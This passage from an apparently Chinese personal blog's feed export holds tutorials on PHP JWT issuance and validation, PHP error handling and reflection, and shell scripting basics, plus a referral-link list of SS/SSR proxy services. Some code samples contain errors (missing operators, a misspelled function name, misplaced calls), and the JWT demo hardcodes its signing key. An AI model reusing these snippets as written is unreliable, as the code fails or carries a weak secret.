class="string">&#x27;jwt123&#x27;</span>;</span><br><span class="line"><span class="comment">//私钥，用于token验证</span></span><br><span class="line"><span class="variable">$signer_key</span> = <span class="string">&#x27;jwt-test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$signer</span> = <span class="keyword">new</span> Sha256();</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = (<span class="keyword">new</span> Builder())-&gt;issuedBy(<span class="variable">$iss</span>)</span><br><span class="line">                        -&gt;permittedFor(<span class="variable">$aud</span>)</span><br><span class="line">                        -&gt;identifiedBy(<span class="variable">$jwt_id</span>, <span class="literal">true</span>)</span><br><span class="line">                        -&gt;issuedAt(time())</span><br><span class="line">                        -&gt;canOnlyBeUsedAfter(time() + <span class="number">60</span>)</span><br><span class="line">                        -&gt;expiresAt(time() + <span class="number">3600</span>)</span><br><span class="line">                        -&gt;set(<span class="string">&#x27;user&#x27;</span>, [<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;police&#x27;</span>, <span class="string">&#x27;mobile&#x27;</span> =&gt; <span class="string">&#x27;110&#x27;</span>])</span><br><span class="line">                        -&gt;withClaim(<span class="string">&#x27;uid&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">                        -&gt;getToken(<span class="variable">$signer</span>, <span class="keyword">new</span> Key(<span class="variable">$signer_key</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="验证token"><a href="#验证token" class="headerlink" title="验证token"></a>验证token</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">ValidationData</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">Parser</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">Signer</span>\<span class="title">Hmac</span>\<span class="title">Sha256</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$token</span>  = (<span class="keyword">new</span> Parser())-&gt;parse((<span class="keyword">string</span>) <span class="variable">$token</span>);</span><br><span class="line"><span class="variable">$signer</span> = <span class="keyword">new</span> Sha256();</span><br><span class="line"></span><br><span class="line"><span class="variable">$aud</span>    = <span class="variable">$token</span>-&gt;getClaim(<span class="string">&#x27;aud&#x27;</span>);</span><br><span class="line"><span class="variable">$iss</span>    = <span class="variable">$token</span>-&gt;getClaim(<span class="string">&#x27;iss&#x27;</span>);</span><br><span class="line"><span class="variable">$jwt_id</span> = <span class="variable">$token</span>-&gt;getHeader(<span class="string">&#x27;jti&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>   = <span class="variable">$token</span>-&gt;getClaim(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$signer_key</span> = <span class="string">&#x27;jwt-test&#x27;</span>;  <span class="comment">//私钥</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> ValidationData();</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>-&gt;setIssuer(<span class="variable">$iss</span>);</span><br><span class="line"><span class="variable">$data</span>-&gt;setAudience(<span class="variable">$aud</span>);</span><br><span class="line"><span class="variable">$data</span>-&gt;setId(<span class="variable">$jwt_id</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//验证私钥</span></span><br><span class="line">var_dump(<span class="variable">$token</span>-&gt;verify(<span class="variable">$signer</span>, <span class="variable">$signer_key</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//失败，因为token在60秒后方可验证</span></span><br><span class="line">var_dump(<span class="variable">$token</span>-&gt;validate(<span class="variable">$data</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改验证时间</span></span><br><span class="line"><span class="variable">$data</span>-&gt;setCurrentTime(time() + <span class="number">60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line">var_dump(<span class="variable">$token</span>-&gt;validate(<span class="variable">$data</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>-&gt;setCurrentTime(time() + <span class="number">4000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//false,token过期</span></span><br><span class="line">var_dump(<span class="variable">$token</span>-&gt;validate(<span class="variable">$data</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP中的错误处理</title>
    <url>/post/30879/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>PHP里有一套错误处理机制，可以使用set_error_handler接管PHP错误处理，也可以使用trigger_error函数主动抛出一个错误。</p>
<span id="more"></span>

<h3 id="set-error-handler"><a href="#set-error-handler" class="headerlink" title="set_error_handler"></a>set_error_handler</h3><p>set_error_handler()函数设置用户自定义的错误处理函数。函数用于创建运行期间的用户自己的错误处理方法。它需要先创建一个错误处理函数，然后设置错误级别。语法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set_error_handler(error_function, error_type)</span><br></pre></td></tr></table></figure>

<ul>
<li>error_function :发生错误时运行的函数</li>
<li>error_type : 错误级别，默认为E_ALL</li>
</ul>
<p>如果使用该函数，会完全绕过PHP错误处理函数，如果有必要，自定义的错误处理程序必须终止脚本</p>
<p>如果在脚本执行前发生错误，那时自定义程序还没有注册，就不会用到自定义错误处理程序</p>
<h3 id="自定义异常处理"><a href="#自定义异常处理" class="headerlink" title="自定义异常处理"></a>自定义异常处理</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;错误代码:&#x27;</span><span class="variable">$errno</span>.<span class="variable">$errstr</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;错误所在:&#x27;</span><span class="variable">$errfile</span>.<span class="variable">$errline</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_error_handler(customError, E_ALL|E_STRICT);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = [<span class="string">&#x27;o&#x27;</span> =&gt; <span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>自定义的错误处理函数一定要有这四个输入变量＄errno、＄errstr、＄errfile、＄errline</p>
<p>errno是一组常量，代表错误的等级，同时也有一组整数和其对应，但一般使用其字符串值表示，这样语义更好一点。比如E_WARNING，其二进制掩码为4.，表示警告信息</p>
<p>接下来，就是将这个函数作为回调参数传递给set_error_handler。这样就能接管PHP原生的错误处理函数了。要注意的是，这种托管方式并不能托管所有种类的错误，如E_ERROR、E_PARSE、E_CORE_ERROR、E_CORE_WARNING、E_COMPILE_ERROR、E_COMPILE_WARNING，以及E_STRICT中的部分。这些错误会以最原始的方式显示，或者不显示</p>
<h3 id="restore-error-handler"><a href="#restore-error-handler" class="headerlink" title="restore_error_handler"></a>restore_error_handler</h3><p>set_error_handler函数会接管PHP内置的错误处理，可以在同一个页面使用restore_error_handler()；取消接管</p>
<p>如果使用自定义的set_error_handler接管PHP的错误处理，代码里的错误抑制@将失效，这种错误也会被显示</p>
<p>在PHP异常中，异常处理机制是有限的，无法自动抛出异常，必须手动进行，并且内置异常有限。PHP把许多异常看作错误，这样就可以把这些“异常”像错误一样用set_error_handler接管，进而主动抛出异常</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$errno</span>.<span class="string">&#x27;|&#x27;</span>.<span class="variable">$errstr</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_error_handler(<span class="string">&#x27;customError&#x27;</span>, E_ALL|E_STRICT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="number">5</span>/<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样就能捕获到异常和非致命的错误，可以弥补PHP异常处理机制的部分不足</p>
<h3 id="register-shutdown-function"><a href="#register-shutdown-function" class="headerlink" title="register_shutdown_function"></a>register_shutdown_function</h3><p>fetal error这样的错误捕获不到，也无法在发生此错误后恢复流程处理，但是还是可以使用一些特殊方法对这种错误进行处理。这需要用到<code>register_shutdown_function()</code></p>
<p>此函数会在PHP程序终止或者die时触发一个函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shutdown</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stop</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (error_get_last()) &#123;</span><br><span class="line">            print_r(error_get_last);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Stop&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    register_shutdown_function([<span class="keyword">new</span> Shutdown(), <span class="string">&#x27;stop&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> a();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;end&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对于fetal error还能做点收尾工作，但是PHP流程的终止是必然的。对于Parse error级别的错误，除了可以修改配置文件php.ini，什么都做不了</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">log_errors</span> = <span class="literal">On</span></span><br><span class="line"><span class="attr">error_log</span> = usr/log/php.log</span><br></pre></td></tr></table></figure>

<p>这样一旦PHP发生了错误，就会被记入log文件，方便以后查询</p>
<h3 id="trigger-error"><a href="#trigger-error" class="headerlink" title="trigger_error"></a>trigger_error</h3><p>和exception类似，错误处理也有对应抛出错误的函数，那就是trigger_error函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$d</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    trigger_error(<span class="string">&#x27;cannot d by zero&#x27;</span>, E_USER_ERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;break&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>在PHP中，错误和异常是两个不同的概念，这种设计从根本上导致了PHP的异常和其他语言相异。以Java为例，Java中，异常是错误唯一的报告方式。说到底，两者的区别就是对异常和错误的认识不同而产生的。PHP的异常绝大部分必须通过某种办法手动抛出，才能被捕获到，是一种半自动化的异常处理机制。 无论是错误还是异常，都可以使用handler接管系统已有的处理机制</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP类反射</title>
    <url>/post/46494/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>面向对象编程中对象被赋予了自省的能力，而这个自省的过程就是反射，反射直观的理解就是根据到达地找出出发地和来源</p>
<p>反射指在PHP运行状态中，扩展分析PHP程序，到处或提取出类，方法，属性，参数等详细信息，包括注释</p>
<span id="more"></span>

<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name <span class="string">&#x27;:&#x27;</span> <span class="keyword">$this</span>-&gt;gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;setting $name to $value&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;未设置&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="string">&#x27;默认值&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$student</span> = <span class="keyword">new</span> Person();</span><br><span class="line"></span><br><span class="line"><span class="variable">$student</span>-&gt;name = <span class="string">&#x27;Ton&#x27;</span>;</span><br><span class="line"><span class="variable">$student</span>-&gt;gender = <span class="string">&#x27;male&#x27;</span>;</span><br><span class="line"><span class="variable">$student</span>-&gt;age = <span class="string">&#x27;24&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="使用API获取属性和方法"><a href="#使用API获取属性和方法" class="headerlink" title="使用API获取属性和方法"></a>使用API获取属性和方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取对象属性列表</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$reflect</span> = <span class="keyword">new</span> ReflectionObject(<span class="variable">$student</span>);</span><br><span class="line"><span class="variable">$props</span> = <span class="variable">$reflect</span>-&gt;getProperties();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$props</span> <span class="keyword">as</span> <span class="variable">$prop</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$prop</span>-&gt;getName();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取对象方法列表</span></span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$reflect</span>-&gt;getMethods();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$m</span> <span class="keyword">as</span> <span class="variable">$prop</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$prop</span>-&gt;getName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用class函数获取属性和方法"><a href="#使用class函数获取属性和方法" class="headerlink" title="使用class函数获取属性和方法"></a>使用class函数获取属性和方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回对象属性的关联数组</span></span><br><span class="line">var_dump(get_object_vars(<span class="variable">$student</span>));</span><br><span class="line"><span class="comment">//类属性</span></span><br><span class="line">var_dump(get_class_vars(get_class(<span class="variable">$student</span>)));</span><br><span class="line"><span class="comment">//返回由类的方法组成的数组</span></span><br><span class="line">var_dump(get_class_methonds(get_class(<span class="variable">$student</span>)));</span><br></pre></td></tr></table></figure>

<h3 id="获取对象属于哪个类"><a href="#获取对象属于哪个类" class="headerlink" title="获取对象属于哪个类"></a>获取对象属于哪个类</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> get_class(<span class="variable">$student</span>);</span><br></pre></td></tr></table></figure>


<h3 id="还原类原型"><a href="#还原类原型" class="headerlink" title="还原类原型"></a>还原类原型</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反射获取类的原型</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> ReflectionClass(<span class="string">&#x27;person&#x27;</span>);</span><br><span class="line"><span class="variable">$className</span> = <span class="variable">$obj</span>-&gt;getName();</span><br><span class="line"><span class="variable">$methods</span> = <span class="variable">$properties</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span>-&gt;getProperties() <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="variable">$properties</span>[<span class="variable">$v</span>-&gt;getName()] = <span class="variable">$v</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span>-&gt;getMethods() <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span>[<span class="variable">$v</span>-&gt;getName()] = <span class="variable">$v</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;class <span class="subst">&#123;$className&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">is_array(<span class="variable">$properties</span>) &amp;&amp; ksort(<span class="variable">$properties</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$v</span>-&gt;isPublic ? <span class="string">&#x27;public&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$v</span>-&gt;isPrivate ? <span class="string">&#x27;private&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$v</span>-&gt;isProtected ? <span class="string">&#x27;protected&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$v</span>-&gt;static ? <span class="string">&#x27;static&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_array(<span class="variable">$methods</span>)) ksort(<span class="variable">$methods</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;function<span class="subst">&#123;$k&#125;</span>()&#123;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PHP手册关于反射API有几十个，反射完整的描述了一个类或对象的原型，反射不仅可以用于类和对象，还可以用于函数，扩展模块，异常等</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>善用反射能保持代码的优雅和简洁，但反射也会破坏类的封装性，因为反射可以使本不该暴露的方法或属性被强制暴露了出来，是优点也是缺点</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>SS/SSR提供商</title>
    <url>/post/39062/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>自己经常用的一些梯子，且用且珍惜</p>
<span id="more"></span>

<h3 id="SuperSTAR"><a href="#SuperSTAR" class="headerlink" title="SuperSTAR"></a>SuperSTAR</h3><p>白嫖公益机场，每月100G，不限速，还要啥自行车</p>
<p>注册地址: <a href="https://srayx.com/#/register?code=flzfKPoM">https://srayx.com/#/register?code=flzfKPoM</a></p>
<h3 id="MENGDI-Cloud"><a href="#MENGDI-Cloud" class="headerlink" title="MENGDI-Cloud"></a>MENGDI-Cloud</h3><p>老牌机场，维持多年，现已接入台湾HINET中华电信,香港HKT、WTT、HKBN、HGC、阿里云CN2、俄罗斯伯力、韩国KT、SK、LG、azure、新加坡CN2、美国CN2、香港azure、日本IIJ、软银,高达1Gbps数据传输最大全力保证大陆宽带,旗下站点X-AIR主要运营V2ray加速</p>
<p>注册地址：<a href="https://dash.nexthud.com/aff/?code=XdZQ">https://dash.nexthud.com/aff/?code=XdZQ</a></p>
<h3 id="Suda-Cloud"><a href="#Suda-Cloud" class="headerlink" title="Suda Cloud"></a>Suda Cloud</h3><p>价格实惠，支持按量付费，界面小清新，速度还可以</p>
<p>注册地址: <a href="https://v2.suda.moe/auth/register?code=GLMx">https://v2.suda.moe/auth/register?code=GLMx</a></p>
<h3 id="Dler-Cloud"><a href="#Dler-Cloud" class="headerlink" title="Dler Cloud"></a>Dler Cloud</h3><p>有点小贵，功能强大，机场包括部分中继节点，港台日等地区节点也挺多，150+节点，包括国际标准节点、国际高级节点、国际优化节点、中国大陆节点等等。</p>
<p>官方网站: <a href="https://dlercloud.com/">https://dlercloud.com/</a></p>
]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>ssr</tag>
      </tags>
  </entry>
  <entry>
    <title>shell编程基础</title>
    <url>/post/16363/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Shell的概念是源自Unix的命令解释器。Shell不仅可解释用户输入的命令，同时，可解释执行基于命令的脚本语言。使用shell脚本能提高用户操作和管理员进行系统管理的效率。shell脚本擅长处理纯文本类型的数据，而Linux中几乎所有的配置文件、日志都是纯文本类型。</p>
<span id="more"></span>

<h3 id="脚本书写规范"><a href="#脚本书写规范" class="headerlink" title="脚本书写规范"></a>脚本书写规范</h3><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>脚本统一存放目录</span><br><span class="line"><span class="number">2.</span>选择解释器, 开头要写#! XXX,内核根据#!后的解释器来确定用哪个解释器解释脚本内容</span><br><span class="line"><span class="number">3.</span>编辑脚本使用vim, 配置~/.vimrc方便个人书写习惯</span><br><span class="line"><span class="number">4.</span>文件名规范，结尾以sh结束</span><br></pre></td></tr></table></figure>

<h3 id="shell的基本元素"><a href="#shell的基本元素" class="headerlink" title="shell的基本元素"></a>shell的基本元素</h3><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>#！/bin/bash 必须的，指出shell的类型</span><br><span class="line"><span class="number">2.</span># 注释。在shell中，注释写在#之后，#之后的内容不会执行</span><br><span class="line"><span class="number">3.</span>变量</span><br><span class="line"><span class="number">4.</span>控制 循环分支</span><br></pre></td></tr></table></figure>

<h3 id="shell中的特殊符号"><a href="#shell中的特殊符号" class="headerlink" title="shell中的特殊符号"></a>shell中的特殊符号</h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="comment">#! 注明执行脚本采用的shell</span></span><br><span class="line"><span class="number">2</span>.<span class="variable">$ </span>变量符。</span><br><span class="line">与反斜杠转义符相反，使其后的普通字符作为变量名，如<span class="variable">$a</span>表示变量a的值。变量</span><br><span class="line">字符长度超过<span class="number">1</span>个时，用&#123;&#125;括起来</span><br><span class="line"><span class="number">3</span>.单引号。</span><br><span class="line">被引起的字符全部做普通字符，即全部原样echo <span class="string">&#x27;my $SHELL&#x27;</span></span><br><span class="line"><span class="number">4</span>.双引号</span><br><span class="line">引号内的内容，除<span class="variable">$、</span>转义符\、倒引号`这三个保留特殊功能，其他字符均做普通字符。</span><br><span class="line"><span class="number">5</span>.倒引号(数字<span class="number">1</span>键旁边的那个键）</span><br><span class="line">引号内的字符串当做shell命令行解释执行（同样的功能也可以使用<span class="variable">$(</span>)来使用），得到的结果</span><br><span class="line">取代整个倒引号括起来的部分。</span><br><span class="line"><span class="number">6</span>.反斜线</span><br><span class="line">反斜线是转义字符，它能把特殊字符变成普通字符。在某个字符前面利用反斜杠（\）能够阻止</span><br><span class="line">shell把后面的字符解释为特殊字符。</span><br><span class="line"><span class="number">7</span>.*  代表0个或者多个特殊字符</span><br><span class="line">例子 yum.* 代表的可以使yum.也可以是yum.a、yum.ab、yum.abc 当然小数点后面可以有多个字母</span><br><span class="line"><span class="number">8</span>.? 代表的是任意一个字符</span><br><span class="line">例子 yum.? 可以是yum.a yum.b yum.c，但是要注意小数点后面必须有任意一个字符</span><br><span class="line"><span class="number">9</span>.[]</span><br><span class="line">代表的是中括号中的任意一个</span><br><span class="line">[abcdef] 可以是a b c d e f 中的任意一个字母当然也可以是数字</span><br><span class="line">[-]代表的是一个范围</span><br><span class="line">[a-z] 表示的是字母a到z之间的所有字母</span><br><span class="line">[^]^是反向选择符号从字面意思可以知道也就是非的意思</span><br><span class="line">[^abc]表示只要不a b c 这三个字符中的任意一个就选择</span><br><span class="line"><span class="number">10</span>.<span class="variable">$(</span> )</span><br><span class="line">可以将命令替换输出赋值给变量</span><br><span class="line"><span class="number">11</span>.&#123;&#125;</span><br><span class="line">通过括号扩展可以生成需要的字串，括号中可以包含连续的序列或使用逗号分隔的多个项目，连续的序列包括一个起点和一个终点</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>echo &#123;a,b,c&#125;</span><br><span class="line"> a b c</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>echo user&#123;<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>&#125;</span><br><span class="line">user1 user5 user8</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>echo &#123;0..<span class="number">10</span>&#125;</span><br><span class="line">0 <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span></span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>mkdir &#123;dir1,dir2,dir3&#125;</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>ls –ld dir&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure>


<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>shell变量可以保存路径名、文件名或者一个数字等。分为三类：</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">本地变量: (局部变量)只在创建它们的<span class="built_in">Shell</span>中使用，可以在<span class="built_in">shell</span>程序内任意使用和修改它</span><br><span class="line">们。</span><br><span class="line">环境变量: 可以在创建它们的<span class="built_in">Shell</span>及其派生出来的任意子程序中使用。有些变量是用户创建</span><br><span class="line">的，其他的则是专用的（比如PATH、HOME)。是系统环境的一部分，不必去定义它们，可以在</span><br><span class="line"><span class="built_in">shell</span>程序中使用它们 。还能在<span class="built_in">shell</span>中加以修改。</span><br><span class="line">内部变量: 由系统提供的。与环境变量不同，用户不能修改它们。</span><br></pre></td></tr></table></figure>


